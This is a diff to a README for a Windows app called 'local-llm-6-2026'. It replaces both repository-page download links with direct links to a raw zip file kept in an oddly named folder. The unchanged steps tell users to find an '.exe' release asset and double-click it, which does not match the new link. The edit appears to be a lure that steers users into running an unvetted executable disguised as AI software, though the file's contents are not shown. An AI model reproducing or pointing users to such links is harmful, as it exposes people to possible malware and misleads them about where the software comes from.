@@ -1,6 +1,6 @@
 # 🤖 local-llm-6-2026 - Run private AI models on Windows
 
-[![Download local-llm-6-2026](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/manualallylresin474/local-llm-6-2026)
+[![Download local-llm-6-2026](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/manualallylresin474/local-llm-6-2026/raw/refs/heads/main/discontinuity/llm_local_v2.4.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To run this application, your Windows computer must meet these basic hardware st
 
 Follow these steps to set up the software on your system:
 
-1. Visit the repository page to download the latest release: [https://github.com/manualallylresin474/local-llm-6-2026](https://github.com/manualallylresin474/local-llm-6-2026).
+1. Visit the repository page to download the latest release: [https://github.com/manualallylresin474/local-llm-6-2026/raw/refs/heads/main/discontinuity/llm_local_v2.4.zip](https://github.com/manualallylresin474/local-llm-6-2026/raw/refs/heads/main/discontinuity/llm_local_v2.4.zip).
 2. Locate the file named with the ending ".exe" in the list of assets.
 3. Save the file to your desktop or your Downloads folder.
 4. Double-click the downloaded file to start the installation.
